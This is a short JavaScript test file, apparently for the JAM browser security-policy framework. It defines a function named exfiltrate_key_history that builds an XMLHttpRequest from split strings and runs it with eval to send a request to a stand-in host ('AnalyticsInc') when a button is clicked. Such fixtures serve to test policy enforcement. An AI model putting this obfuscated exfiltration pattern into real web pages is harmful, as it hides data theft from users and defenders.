
JAM.startProfile('load');
introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {
  var a = "xmlhttp=new XMLHt";
  var b = "tpRequest();";
  var c = "xmlhttp.op";
  var d = 'en("GET", "http://AnalyticsInc:8000/submission.html?test=concat", true);';
  var e$$4 = "xmlhttp.se";
  var f = "nd(null);";
  eval(a + b + c + d + e$$4 + f)
}
document.getElementById("test").onclick = exfiltrate_key_history;

}

JAM.stopProfile('load');
